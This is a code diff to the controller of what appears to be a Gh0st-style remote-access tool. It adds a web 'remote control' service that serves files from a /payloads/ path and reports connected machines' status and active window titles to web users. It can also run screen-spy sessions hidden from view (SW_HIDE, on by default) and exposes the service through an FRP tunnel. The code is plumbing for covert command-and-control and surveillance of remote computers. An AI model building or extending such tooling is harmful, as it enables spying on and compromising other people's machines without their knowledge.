@@ -22,6 +22,7 @@
 #include <vector>
 #include <map>
 #include <mutex>
+#include <filesystem>
 #include "KeyBoardDlg.h"
 #include "InputDlg.h"
 #include "CPasswordDlg.h"
@@ -618,10 +619,6 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
     if (m_tinyDLL) {
         MemoryFreeLibrary(m_tinyDLL);
         m_tinyDLL = NULL;
-    }
-    if (m_FileServer) {
-        m_FileServer->Stop();
-        SAFE_DELETE(m_FileServer);
     }
     if (m_pSearchBar) {
         m_pSearchBar->DestroyWindow();
@@ -1356,6 +1353,10 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
     // 添加到列表并更新索引
     m_ClientIndex[id] = m_HostList.size();
     m_HostList.push_back(ContextObject);
+    // 通知 Web 服务（批量通知，由定时器触发）
+    if (WebService().IsRunning()) {
+        WebService().MarkDeviceOnline(id);
+    }
     // 加入待处理队列，由定时器批量更新 UI（减少闪烁）
     if (groupName == m_selectedGroup || (groupName.empty() && m_selectedGroup == "default")) {
         m_PendingOnline.push_back(ContextObject);
@@ -1721,11 +1722,25 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     THIS_CFG.SetStr("settings", "MasterHash", GetMasterHash());
     THIS_CFG.SetStr("settings", "Version", VERSION_STR);
 
-    UPDATE_SPLASH(16, "正在启动下载服务...");
-	auto fileSvrPort = THIS_CFG.GetInt("settings", "FileSvrPort", -1);
-    m_FileServer = fileSvrPort > 0  ? new FileDownloadServer(fileSvrPort) : nullptr;
-    if (m_FileServer && !m_FileServer->Start()) {
-        THIS_APP->MessageBox(_TR("下载服务启动失败，可能是端口被占用了。"), _TR("提示"), MB_ICONINFORMATION);
+    // Start Web Remote Control service (includes file download at /payloads/*)
+    UPDATE_SPLASH(16, "正在启动Web远程服务...");
+    auto webSvrPort = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
+    if (webSvrPort > 0) {
+        WebService().SetParentDlg(this);
+        // Use master password as web login password
+        if (!m_superPass.empty()) {
+            WebService().SetAdminPassword(m_superPass);
+        } else {
+            Mprintf("[WebService] Warning: No master password set, web login disabled\n");
+        }
+        // HideWebSessions: 1=hide (default), 0=show (for debugging)
+        WebService().SetHideWebSessions(THIS_CFG.GetInt("settings", "HideWebSessions", 1) != 0);
+        if (!WebService().Start(webSvrPort)) {
+            Mprintf("WebService start failed on port %d\n", webSvrPort);
+        } else {
+            Mprintf("WebService started on port %d (HideWebSessions=%d)\n",
+                    webSvrPort, WebService().GetHideWebSessions() ? 1 : 0);
+        }
     }
 
     UPDATE_SPLASH(18, "正在初始化文件上传模块...");
@@ -1806,8 +1821,9 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
         THIS_APP->MessageBoxL("请通过菜单设置公网地址!", "提示", MB_ICONINFORMATION);
     }
     int port = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
-    if (fileSvrPort == port) {
-        THIS_APP->MessageBoxL("监听端口和文件下载服务端口冲突!", "提示", MB_ICONINFORMATION);
+    int webSvrPortCheck = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
+    if (webSvrPortCheck > 0 && webSvrPortCheck == port) {
+        THIS_APP->MessageBoxL("监听端口和Web服务端口冲突!", "提示", MB_ICONINFORMATION);
     }
     std::string master = ip.empty() ? "" : ip + ":" + std::to_string(port);
     const Validation* v = GetValidation();
@@ -2730,7 +2746,7 @@ void CMy2015RemoteDlg::ApplyFrpSettings()
     std::string token = THIS_CFG.GetStr("frp", "token");
     auto ports = THIS_CFG.GetStr("settings", "ghost", "6543");
     auto arr = StringToVector(ports, ';');
-    int fileServerPort = THIS_CFG.GetInt("settings", "FileSvrPort", 80);
+    int fileServerPort = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
 
     // 为每个服务端生成独立配置文件 (index=0 用 frpc.ini 保持兼容)
     for (size_t idx = 0; idx < servers.size(); ++idx) {
@@ -2755,7 +2771,7 @@ void CMy2015RemoteDlg::ApplyFrpSettings()
             cfg.SetStr(udp, "remote_port", arr[i]);
         }
         if (fileServerPort > 0) {
-            std::string name = BRAND_NET_PREFIX "-FS-" + std::to_string(fileServerPort);
+            std::string name = BRAND_NET_PREFIX "-WEB-" + std::to_string(fileServerPort);
             cfg.SetStr(name, "type", "tcp");
             cfg.SetInt(name, "local_port", fileServerPort);
             cfg.SetInt(name, "remote_port", fileServerPort);
@@ -3043,6 +3059,10 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
                 m_CList_Online.RedrawItems(minIdx, maxIdx);
             }
             m_DirtyClients.clear();
+        // 批量通知 Web 客户端设备变化
+        if (WebService().IsRunning()) {
+            WebService().FlushDeviceChanges();
+        }
         }
     }
     if (nIDEvent == TIMER_STATUSBAR_UPDATE) {
@@ -3276,6 +3296,13 @@ void CMy2015RemoteDlg::OnClose()
 void CMy2015RemoteDlg::Release()
 {
     Mprintf("======> Release\n");
+
+    // Stop Web Remote Control service
+    if (WebService().IsRunning()) {
+        Mprintf("Stopping WebService...\n");
+        WebService().Stop();
+    }
+
     UninitFileUpload();
     DeletePopupWindow(TRUE);
     isClosed = TRUE;
@@ -5439,6 +5466,10 @@ bool CMy2015RemoteDlg::RemoveFromHostList(context* ctx)
 {
     if (!ctx) return false;
     uint64_t clientID = ctx->GetClientID();
+    // 通知 Web 服务（批量通知，由定时器触发）
+    if (WebService().IsRunning()) {
+        WebService().MarkDeviceOffline(clientID);
+    }
 
     // 方案1：通过索引快速查找（如果索引有效且匹配）
     auto indexIt = m_ClientIndex.find(clientID);
@@ -5876,6 +5907,27 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
             id->SetLastHeartbeat(time(0));
             if (changed) {
                 m_DirtyClients.insert(clientID);
+
+                // Notify web clients of device update
+                if (WebService().IsRunning()) {
+                    std::string rtt = hb.Ping > 0 ? std::to_string(hb.Ping) : "";
+                    // Convert ANSI to UTF-8 for web
+                    std::string activeWnd;
+                    CString csActiveWnd(hb.ActiveWnd);
+                    if (!csActiveWnd.IsEmpty()) {
+                        int wlen = MultiByteToWideChar(CP_ACP, 0, csActiveWnd, -1, NULL, 0);
+                        if (wlen > 0) {
+                            std::wstring wstr(wlen - 1, L'\0');
+                            MultiByteToWideChar(CP_ACP, 0, csActiveWnd, -1, &wstr[0], wlen);
+                            int u8len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+                            if (u8len > 0) {
+                                activeWnd.resize(u8len - 1);
+                                WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &activeWnd[0], u8len, NULL, NULL);
+                            }
+                        }
+                    }
+                    WebService().NotifyDeviceUpdate(clientID, rtt, activeWnd);
+                }
             }
         }
     }
@@ -6236,6 +6288,9 @@ LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
         Mprintf("收到远程桌面打开消息, 对话框已经销毁: %llu\n", dlgID);
         BYTE bToken = COMMAND_BYE;
         return ContextObject->Send2Client(&bToken, 1) ? 0 : 0x20260223;
+    }
+    if (clientID && WebService().IsRunning() && WebService().IsWebTriggered(clientID) && WebService().GetHideWebSessions()) {
+        return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_HIDE>(wParam, lParam);
     }
     return OpenDialog<CScreenSpyDlg, IDD_DIALOG_SCREEN_SPY, SW_SHOWMAXIMIZED>(wParam, lParam);
 }
@@ -8067,6 +8122,29 @@ void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd)
     EnterCriticalSection(&m_cs);
     m_RemoteWnds.erase(wnd);
     LeaveCriticalSection(&m_cs);
+}
+
+void CMy2015RemoteDlg::CloseRemoteDesktopByClientID(uint64_t clientID)
+{
+    CScreenSpyDlg* targetDlg = nullptr;
+    HWND hWnd = NULL;
+
+    EnterCriticalSection(&m_cs);
+    for (auto& pair : m_RemoteWnds) {
+        CScreenSpyDlg* dlg = dynamic_cast<CScreenSpyDlg*>(pair.second);
+        if (dlg && dlg->GetClientID() == clientID) {
+            targetDlg = dlg;
+            hWnd = dlg->GetSafeHwnd();
+            break;
+        }
+    }
+    LeaveCriticalSection(&m_cs);
+
+    if (targetDlg && hWnd && ::IsWindow(hWnd)) {
+        // Use SendMessage for synchronous close to prevent race condition
+        // when user reconnects quickly after disconnect
+        ::SendMessage(hWnd, WM_CLOSE, 0, 0);
+    }
 }
 
 void CMy2015RemoteDlg::UpdateActiveRemoteSession(CDialogBase *sess)
